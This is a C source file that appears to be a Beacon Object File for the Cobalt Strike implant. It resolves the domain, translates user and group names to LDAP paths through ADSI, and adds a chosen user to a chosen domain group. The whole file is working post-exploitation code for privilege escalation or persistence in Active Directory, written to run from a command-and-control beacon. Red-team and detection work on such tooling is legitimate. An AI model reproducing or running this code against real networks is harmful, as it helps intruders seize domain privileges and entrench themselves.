#include "AddUserToDomainGroup.h"
#include "beacon.h"

#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "ADSIid.lib")
#pragma comment(lib, "Activeds.lib")

#define RETURN_IF_HR_FAILED(hr)                                                                                   \
    if (!SUCCEEDED(hr))                                                                                           \
    {                                                                                                             \
        BeaconPrintf(CALLBACK_ERROR, "failed at %d lasterr: %d - hr: %X", __LINE__, KERNEL32$GetLastError(), hr); \
        goto Cleanup;                                                                                             \
    }

HRESULT NtToLdap(LPWSTR szNtDomain, LPWSTR szNtName, LPWSTR *szLdapPath)
{
    IADsNameTranslate *pNto;
    HRESULT hr;

    IID IID_IADsNameTranslate = {0xB1B272A3, 0x3625, 0x11D1, {0xA3, 0xA4, 0x00, 0xC0, 0x4F, 0xB9, 0x50, 0xDC}};
    CLSID CLSID_NameTranslate = {0x274FAE1F, 0x3626, 0x11D1, {0xA3, 0xA4, 0x00, 0xC0, 0x4F, 0xB9, 0x50, 0xDC}};

    hr = OLE32$CoCreateInstance(CLSID_NameTranslate,
                                NULL,
                                CLSCTX_INPROC_SERVER,
                                IID_IADsNameTranslate,
                                (void **)&pNto);

    RETURN_IF_HR_FAILED(hr);

    hr = pNto->Init(ADS_NAME_INITTYPE_DOMAIN, szNtDomain);
    RETURN_IF_HR_FAILED(hr);

    hr = pNto->Set(ADS_NAME_TYPE_NT4, szNtName);
    RETURN_IF_HR_FAILED(hr);

    hr = pNto->Get(ADS_NAME_TYPE_1779, szLdapPath);
    RETURN_IF_HR_FAILED(hr);

Cleanup:
    if (pNto)
        pNto->Release();

    return hr;
}

LPWSTR GetDomainName()
{
    DSROLE_PRIMARY_DOMAIN_INFO_BASIC *buffer;
    DWORD dwRet;
    LPWSTR szRet = NULL;
    dwRet = NETAPI32$DsRoleGetPrimaryDomainInformation(NULL,
                                                       DsRolePrimaryDomainInfoBasic,
                                                       (PBYTE *)&buffer);

    if (dwRet == ERROR_SUCCESS && buffer->DomainNameFlat != NULL)
    {
        szRet = buffer->DomainNameFlat;
    }

    return szRet;
}

VOID AddUserToDomainGroup(LPWSTR szInputUserName, LPWSTR szInputGroup)
{
    HRESULT hr;
    IADs *pUsr = NULL;
    LPWSTR szUserLdapPath = NULL;
    LPWSTR szGroupLdapPath = NULL;
    LPWSTR szNtDomain = NULL;
    WCHAR szUserName[MAX_LDAP_DN] = {0};
    WCHAR szGroupName[MAX_LDAP_DN] = {0};
    IADsGroup *pTargetGroup = NULL;

    IID IID_IADsGroup = {0x27636B00, 0x410F, 0x11CF, {0xB1, 0xFF, 0x02, 0x60, 0x8C, 0x9E, 0x75, 0x53}};

    hr = OLE32$CoInitialize();
    RETURN_IF_HR_FAILED(hr);

    szNtDomain = GetDomainName();
    if (!szNtDomain)
    {
        BeaconPrintf(CALLBACK_ERROR, "GetDomainName");
        goto Cleanup;
    }

    if (MSVCRT$swprintf_s(szUserName, MAX_LDAP_DN, L"%s\\%s", szNtDomain, szInputUserName) == -1)
    {
        BeaconPrintf(CALLBACK_ERROR, "swprintf_s username");
         goto Cleanup;
    }

    if (MSVCRT$swprintf_s(szGroupName, MAX_LDAP_DN, L"%s\\%s", szNtDomain, szInputGroup) == -1)
    {
        BeaconPrintf(CALLBACK_ERROR, "swprintf_s group");
        goto Cleanup;
    }

    hr = NtToLdap(szNtDomain, szUserName, &szUserLdapPath);
    RETURN_IF_HR_FAILED(hr);

    hr = NtToLdap(szNtDomain, szGroupName, &szGroupLdapPath);
    RETURN_IF_HR_FAILED(hr);


    MSVCRT$memset(szGroupName, 0, MAX_LDAP_DN);
    if (MSVCRT$swprintf_s(szGroupName, MAX_LDAP_DN, L"LDAP://%s", szGroupLdapPath) == -1)
    {
        BeaconPrintf(CALLBACK_ERROR, "swprintf_s ldap group");
        goto Cleanup;
    }


    hr = ACTIVEDS$ADsGetObject(szGroupName, IID_IADsGroup, (void **)&pTargetGroup);
    RETURN_IF_HR_FAILED(hr);

    // we have to prepend LDAP:// to the ldap path
    MSVCRT$memset(szUserName, 0, MAX_LDAP_DN);
    if (MSVCRT$swprintf_s(szUserName, MAX_LDAP_DN, L"LDAP://%s", szUserLdapPath) == -1)
    {
        BeaconPrintf(CALLBACK_ERROR, "swprintf_s ldap user");
        goto Cleanup;
    }

    hr = pTargetGroup->Add(szUserName);
    RETURN_IF_HR_FAILED(hr);

	BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully added the user %ws to %ws group", szInputUserName, szInputGroup);
	
Cleanup:
    if (pTargetGroup)
        pTargetGroup->Release();

    if (szUserLdapPath)
        OLEAUT32$SysFreeString(szUserLdapPath);

    OLE32$CoUninitialize();
}

VOID go(IN PCHAR Args, IN ULONG Length)
{
    datap parser;
    LPWSTR szInputUserName = NULL,
           szInputGroup = NULL;

    BeaconDataParse(&parser, Args, Length);

    szInputUserName = (WCHAR *)BeaconDataExtract(&parser, NULL);
    szInputGroup = (WCHAR *)BeaconDataExtract(&parser, NULL);

    if (!szInputUserName || !szInputGroup)
    {
        BeaconPrintf(CALLBACK_ERROR, "invalid args");
        return;
    }

    AddUserToDomainGroup(szInputUserName, szInputGroup);
}